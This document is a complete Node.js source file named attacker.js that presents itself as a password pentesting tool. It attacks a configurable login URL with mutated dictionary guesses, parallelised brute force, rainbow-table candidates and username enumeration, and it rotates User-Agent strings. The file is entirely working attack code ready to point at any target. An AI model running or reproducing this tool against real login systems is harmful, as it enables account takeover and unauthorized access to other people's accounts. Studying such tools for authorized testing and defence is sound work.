const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const fetch = global.fetch || require('node-fetch');
const CONFIG = {
    targetUrl: process.env.TARGET_URL || 'http://localhost:3000/login',
    dictPath: path.resolve(__dirname, 'dictionary.txt'),
    rainbowTablePath: path.resolve(__dirname, 'rainbow_table.json'),
    maxTries: parseInt(process.env.MAX_TRIES || '20000000'),
    concurrency: parseInt(process.env.CONCURRENCY || '10'),
    timeout: parseInt(process.env.TIMEOUT || '5000'),
    delayMs: parseInt(process.env.DELAY_MS || '0'),
    userAgents: [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
    ],
    logFile: path.resolve(__dirname, 'pentest_log.txt'),
    statsFile: path.resolve(__dirname, 'pentest_stats.json')
};
let found = false;
let stats = {
    startTime: Date.now(),
    totalTried: 0,
    successful: [],
    failed: 0,
    errors: 0,
    requestTimes: []
};
const FOUND_FLAG_FILE = path.resolve(__dirname, '.password_found.lock');

function log(message, level = 'INFO') {
    const timestamp = new Date().toISOString();
    const logMessage = `[${timestamp}] [${level}] ${message}`;
    console.log(logMessage);
    fs.appendFileSync(CONFIG.logFile, logMessage + '\n');
}

function saveStats() {
    const duration = (Date.now() - stats.startTime) / 1000;
    const avgTime = stats.requestTimes.length > 0
        ? stats.requestTimes.reduce((a, b) => a + b, 0) / stats.requestTimes.length
        : 0;
    const finalStats = {
        ...stats,
        duration: `${duration.toFixed(2)}s`,
        averageRequestTime: `${avgTime.toFixed(2)}ms`,
        requestsPerSecond: (stats.totalTried / duration).toFixed(2)
    };
    fs.writeFileSync(CONFIG.statsFile, JSON.stringify(finalStats, null, 2));
    log(`Statistics saved to ${CONFIG.statsFile}`, 'INFO');
}

const pLimit = (concurrency) => {
    const queue = [];
    let active = 0;
    const next = () => {
        if (queue.length === 0) return;
        if (active >= concurrency) return;
        active++;
        const {fn, resolve} = queue.shift();
        fn().then((r) => {
            active--;
            resolve(r);
            next();
        }, (e) => {
            active--;
            resolve(Promise.reject(e));
            next();
        });
    };
    return (fn) => new Promise((resolve) => {
        queue.push({fn, resolve});
        next();
    });
};

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function getRandomUserAgent() {
    return CONFIG.userAgents[Math.floor(Math.random() * CONFIG.userAgents.length)];
}

function checkIfFoundByOtherInstance() {
    if (fs.existsSync(FOUND_FLAG_FILE)) {
        try {
            const data = JSON.parse(fs.readFileSync(FOUND_FLAG_FILE, 'utf8'));
            return data;
        } catch (err) {
            return null;
        }
    }
    return null;
}

function markAsFound(username, password) {
    const data = {
        username,
        password,
        timestamp: new Date().toISOString(),
        instanceId: getInstanceConfig().instanceId
    };
    fs.writeFileSync(FOUND_FLAG_FILE, JSON.stringify(data, null, 2));
    log(`Created shared lock file: ${FOUND_FLAG_FILE}`, 'SUCCESS');
}

function cleanupFoundFlag() {
    if (fs.existsSync(FOUND_FLAG_FILE)) {
        fs.unlinkSync(FOUND_FLAG_FILE);
        log(`Cleaned up lock file: ${FOUND_FLAG_FILE}`, 'INFO');
    }
}

function startFoundFlagMonitor() {
    const intervalId = setInterval(() => {
        if (found) {
            clearInterval(intervalId);
            return;
        }
        const foundByOther = checkIfFoundByOtherInstance();
        if (foundByOther) {
            found = true;
            log(`\n${'='.repeat(60)}`, 'SUCCESS');
            log(`PASSWORD FOUND BY INSTANCE ${foundByOther.instanceId}!`, 'SUCCESS');
            log(`Username: ${foundByOther.username}`, 'SUCCESS');
            log(`Password: ${foundByOther.password}`, 'SUCCESS');
            log(`Timestamp: ${foundByOther.timestamp}`, 'SUCCESS');
            log(`${'='.repeat(60)}\n`, 'SUCCESS');
            log('Stopping this instance...', 'INFO');
            clearInterval(intervalId);
            setTimeout(() => {
                saveStats();
                process.exit(0);
            }, 1000);
        }
    }, 2000);
    return intervalId;
}

function generateHash(password, algorithm = 'sha256') {
    return crypto.createHash(algorithm).update(password).digest('hex');
}

function buildRainbowTable(wordlist, outputPath, algorithms = ['md5', 'sha1', 'sha256']) {
    log(`Building Rainbow Table with algorithms: ${algorithms.join(', ')}`, 'INFO');
    const table = {};
    let count = 0;
    for (const algorithm of algorithms) {
        for (const password of wordlist) {
            const hash = generateHash(password, algorithm);
            if (!table[hash]) {
                table[hash] = { password, algorithm };
                count++;
                if (count % 1000 === 0) {
                    process.stdout.write(`\rGenerated: ${count} entries`);
                }
            }
        }
    }
    log(`\nRainbow Table created: ${count} entries`, 'SUCCESS');
    fs.writeFileSync(outputPath, JSON.stringify(table, null, 2));
    log(`Saved to: ${outputPath}`, 'SUCCESS');
    return table;
}

function loadRainbowTable(filePath) {
    if (fs.existsSync(filePath)) {
        log(`Loading Rainbow Table from ${filePath}...`, 'INFO');
        const data = fs.readFileSync(filePath, 'utf8');
        const table = JSON.parse(data);
        log(`Rainbow Table loaded: ${Object.keys(table).length} entries`, 'SUCCESS');
        return table;
    }
    return null;
}

function buildBaseWords() {
    const words = new Set();
    if (fs.existsSync(CONFIG.dictPath)) {
        const lines = fs.readFileSync(CONFIG.dictPath, 'utf8')
            .split(/\r?\n/)
            .map(l => l.trim())
            .filter(Boolean);
        lines.forEach(w => words.add(w));
    }
    const commonPasswords = [
        'password', '123456', '12345678', 'qwerty', 'abc123',
        'monkey', 'letmein', 'trustno1', 'dragon', 'baseball',
        'iloveyou', 'master', 'sunshine', 'ashley', 'bailey',
        'passw0rd', 'shadow', 'admin', 'admin123', 'root'
    ];
    commonPasswords.forEach(p => words.add(p));
    return Array.from(words);
}

const leetMap = {
    a: ['4', '@'], e: ['3'], i: ['1', '!'],
    o: ['0'], s: ['5', '$'], t: ['7'],
    l: ['1'], g: ['9'], b: ['8']
};

function leetVariants(word) {
    const res = new Set();
    function helper(idx, cur) {
        if (idx === word.length) {
            res.add(cur);
            return;
        }
        const ch = word[idx];
        helper(idx + 1, cur + ch);
        const low = ch.toLowerCase();
        if (leetMap[low]) {
            for (const sub of leetMap[low]) helper(idx + 1, cur + sub);
        }
    }
    helper(0, '');
    return Array.from(res).slice(0, 50);
}

function capsVariants(s) {
    return [
        s,
        s.toLowerCase(),
        s.toUpperCase(),
        s[0].toUpperCase() + s.slice(1).toLowerCase(),
        s[0].toLowerCase() + s.slice(1).toUpperCase()
    ];
}

function expandWithMutations(baseWords) {
    const out = new Set();
    const currentYear = new Date().getFullYear();
    const commonSuffixes = [
        '!', '!!', '123', '1234', '12345',
        '2020', '2021', '2022', '2023', '2024', currentYear.toString(),
        '@', '#', '$', '!!!'
    ];
    const commonPrefixes = ['!', '@', '#'];
    log(`Expanding ${baseWords.length} base words with mutations...`, 'INFO');
    for (const w of baseWords) {
        out.add(w);
        for (const v of capsVariants(w)) {
            out.add(v);
            for (const s of commonSuffixes) {
                out.add(v + s);
            }
            for (const p of commonPrefixes) {
                out.add(p + v);
            }
            const leets = leetVariants(v);
            leets.slice(0, 10).forEach(l => out.add(l));
        }
        out.add(w + '123');
        out.add(w + '!');
        out.add(w + '@123');
        out.add(w + currentYear);
    }
    log(`Generated ${out.size} password candidates`, 'SUCCESS');
    return Array.from(out);
}

function* generateBruteForce(charset, maxLen, startIdx = 0, skipCount = 1) {
    let currentIdx = 0;
    for (let len = 1; len <= maxLen; len++) {
        const indices = Array(len).fill(0);
        while (true) {
            if (currentIdx >= startIdx && (currentIdx - startIdx) % skipCount === 0) {
                yield indices.map(i => charset[i]).join('');
            }
            currentIdx++;
            let pos = len - 1;
            while (pos >= 0) {
                indices[pos]++;
                if (indices[pos] < charset.length) break;
                indices[pos] = 0;
                pos--;
            }
            if (pos < 0) break;
        }
    }
}

async function tryCandidate(candidate, username) {
    if (found) return false;
    const foundByOther = checkIfFoundByOtherInstance();
    if (foundByOther) {
        found = true;
        return false;
    }
    const startTime = Date.now();
    const body = { username, password: candidate };
    try {
        if (CONFIG.delayMs > 0) {
            await sleep(CONFIG.delayMs);
        }
        const resp = await fetch(CONFIG.targetUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': getRandomUserAgent()
            },
            body: JSON.stringify(body),
            timeout: CONFIG.timeout
        });
        const requestTime = Date.now() - startTime;
        stats.requestTimes.push(requestTime);
        stats.totalTried++;
        if (resp.status === 200) {
            log(`PASSWORD FOUND for ${username}: ${candidate}`, 'SUCCESS');
            stats.successful.push({ username, password: candidate, timestamp: new Date().toISOString() });
            found = true;
            markAsFound(username, candidate);
            return true;
        } else {
            stats.failed++;
            return false;
        }
    } catch (err) {
        stats.errors++;
        log(`Network error for candidate: ${err.message}`, 'ERROR');
        return false;
    }
}

async function dictionaryAttack(username, candidates, instanceId, totalInstances) {
    log('\n=== DICTIONARY ATTACK ===', 'INFO');
    if (totalInstances > 1) {
        const chunkSize = Math.ceil(candidates.length / totalInstances);
        const start = instanceId * chunkSize;
        const end = Math.min(start + chunkSize, candidates.length);
        candidates = candidates.slice(start, end);
        log(`Instance ${instanceId + 1}/${totalInstances} processing ${candidates.length} candidates`, 'INFO');
    }
    const limit = pLimit(CONFIG.concurrency);
    let tested = 0;
    for (const candidate of candidates) {
        if (found) break;
        await limit(() => tryCandidate(candidate, username));
        tested++;
        if (tested % 100 === 0) {
            process.stdout.write(`\rTested: ${tested}/${candidates.length} (${(tested/candidates.length*100).toFixed(1)}%)`);
        }
    }
    console.log('');
    log(`Dictionary attack completed: ${tested} passwords tested`, 'INFO');
}

async function bruteForceAttack(username, charset, maxLen, instanceId, totalInstances) {
    log('\n=== BRUTE FORCE ATTACK ===', 'INFO');
    log(`Charset: ${charset.join('')}`, 'INFO');
    log(`Max Length: ${maxLen}`, 'INFO');
    log(`Instance: ${instanceId + 1}/${totalInstances}`, 'INFO');
    const generator = generateBruteForce(charset, maxLen, instanceId, totalInstances);
    const limit = pLimit(CONFIG.concurrency);
    let tested = 0;
    for (const candidate of generator) {
        if (found) break;
        await limit(() => tryCandidate(candidate, username));
        tested++;
        if (tested % 1000 === 0) {
            process.stdout.write(`\rBrute-Force attempts: ${tested}`);
        }
        if (tested >= CONFIG.maxTries) {
            log(`\nMax tries (${CONFIG.maxTries}) reached`, 'WARNING');
            break;
        }
    }
    console.log('');
    log(`Brute force completed: ${tested} combinations tested`, 'INFO');
}

async function rainbowTableAttack(username, rainbowTable) {
    log('\n=== RAINBOW TABLE ATTACK ===', 'INFO');
    const passwords = Object.values(rainbowTable).map(entry =>
        typeof entry === 'string' ? entry : entry.password
    );
    log(`Testing ${passwords.length} passwords from Rainbow Table...`, 'INFO');
    const limit = pLimit(CONFIG.concurrency);
    let tested = 0;
    for (const password of passwords) {
        if (found) break;
        await limit(() => tryCandidate(password, username));
        tested++;
        if (tested % 100 === 0) {
            process.stdout.write(`\rTested: ${tested}/${passwords.length}`);
        }
    }
    console.log('');
    log(`Rainbow Table attack completed: ${tested} passwords tested`, 'INFO');
}

async function enumerateUsers(usernames) {
    log('\n=== USERNAME ENUMERATION ===', 'INFO');
    const validUsers = [];
    for (const username of usernames) {
        try {
            const resp = await fetch(CONFIG.targetUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': getRandomUserAgent()
                },
                body: JSON.stringify({ username, password: 'invalid_password_test_12345' }),
                timeout: CONFIG.timeout
            });
            if (resp.status !== 404) {
                validUsers.push(username);
                log(`Potential valid username: ${username} (Status: ${resp.status})`, 'INFO');
            }

            await sleep(CONFIG.delayMs);
        } catch (err) {
            log(`Error testing username ${username}: ${err.message}`, 'ERROR');
        }
    }
    log(`Found ${validUsers.length} potential valid usernames`, 'SUCCESS');
    return validUsers;
}

function getInstanceConfig() {
    const instanceId = parseInt(process.env.INSTANCE_ID || process.argv[4] || '0');
    const totalInstances = parseInt(process.env.TOTAL_INSTANCES || process.argv[5] || '1');
    return { instanceId, totalInstances };
}

const USERNAME = process.argv[2];
const MODE = process.argv[3] || 'dictionary';
if (!USERNAME) {
    console.error('Usage: node attacker.js <username> <mode> [instanceId] [totalInstances]');
    console.error('');
    console.error('Modes:');
    console.error('  dictionary    - Dictionary attack with mutations');
    console.error('  bruteforce    - Brute force attack (parallelizable)');
    console.error('  rainbow       - Rainbow table attack');
    console.error('  create-table  - Create rainbow table from dictionary');
    console.error('  enumerate     - Enumerate valid usernames');
    console.error('  hybrid        - Combination of dictionary + brute force');
    console.error('');
    console.error('Examples:');
    console.error('  node attacker.js admin dictionary');
    console.error('  node attacker.js admin bruteforce 0 4    # Instance 1 of 4');
    console.error('  node attacker.js admin rainbow');
    console.error('  node attacker.js admin create-table');
    console.error('  node attacker.js admin enumerate');
    console.error('  node attacker.js admin hybrid');
    console.error('');
    console.error('Environment Variables:');
    console.error('  TARGET_URL      - Target URL (default: http://localhost:3000/login)');
    console.error('  CONCURRENCY     - Concurrent requests (default: 10)');
    console.error('  DELAY_MS        - Delay between requests in ms (default: 0)');
    console.error('  MAX_TRIES       - Maximum attempts (default: 20000000)');
    console.error('  TIMEOUT         - Request timeout in ms (default: 5000)');
    process.exit(1);
}

(async () => {
    log('\n=== PASSWORD PENTESTING TOOL ===', 'INFO');
    log(`Target: ${CONFIG.targetUrl}`, 'INFO');
    log(`Username: ${USERNAME}`, 'INFO');
    log(`Mode: ${MODE}`, 'INFO');
    log(`Concurrency: ${CONFIG.concurrency}`, 'INFO');
    log(`Delay: ${CONFIG.delayMs}ms`, 'INFO');
    const { instanceId, totalInstances } = getInstanceConfig();
    if (instanceId === 0 && MODE !== 'create-table' && MODE !== 'enumerate') {
        cleanupFoundFlag();
    }
    let monitorInterval;
    if (totalInstances > 1 && MODE !== 'create-table' && MODE !== 'enumerate') {
        log(`Starting shared state monitor (checking every 2s)...`, 'INFO');
        monitorInterval = startFoundFlagMonitor();
    }
    try {
        if (MODE === 'create-table') {
            const baseWords = buildBaseWords();
            const candidates = expandWithMutations(baseWords);
            buildRainbowTable(candidates, CONFIG.rainbowTablePath, ['md5', 'sha1', 'sha256']);
            process.exit(0);
        }
        if (MODE === 'enumerate') {
            const commonUsernames = [
                'admin', 'administrator', 'root', 'user', 'test',
                'guest', 'info', 'support', 'webmaster', 'manager'
            ];
            await enumerateUsers(commonUsernames);
            process.exit(0);
        }
        if (MODE === 'rainbow') {
            let rainbowTable = loadRainbowTable(CONFIG.rainbowTablePath);
            if (!rainbowTable) {
                log('No Rainbow Table found. Use create-table mode first.', 'ERROR');
                process.exit(1);
            }
            await rainbowTableAttack(USERNAME, rainbowTable);
        }
        if (MODE === 'dictionary' || MODE === 'hybrid') {
            const baseWords = buildBaseWords();
            const candidates = expandWithMutations(baseWords);
            await dictionaryAttack(USERNAME, candidates, instanceId, totalInstances);
        }
        if ((MODE === 'bruteforce' || MODE === 'hybrid') && !found) {
            const charset = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$_-'.split('');
            const maxLen = 32;
            await bruteForceAttack(USERNAME, charset, maxLen, instanceId, totalInstances);
        }
        if (monitorInterval) {
            clearInterval(monitorInterval);
        }
        log('\n=== PENTEST COMPLETED ===', 'INFO');
        if (found) {
            log('Password found! Check logs for details.', 'SUCCESS');
        } else {
            log('Password not found within configured limits.', 'WARNING');
        }
        saveStats();
        process.exit(found ? 0 : 1);
    } catch (err) {
        if (monitorInterval) {
            clearInterval(monitorInterval);
        }
        log(`Fatal error: ${err.message}`, 'ERROR');
        log(err.stack, 'ERROR');
        saveStats();
        process.exit(1);
    }
})();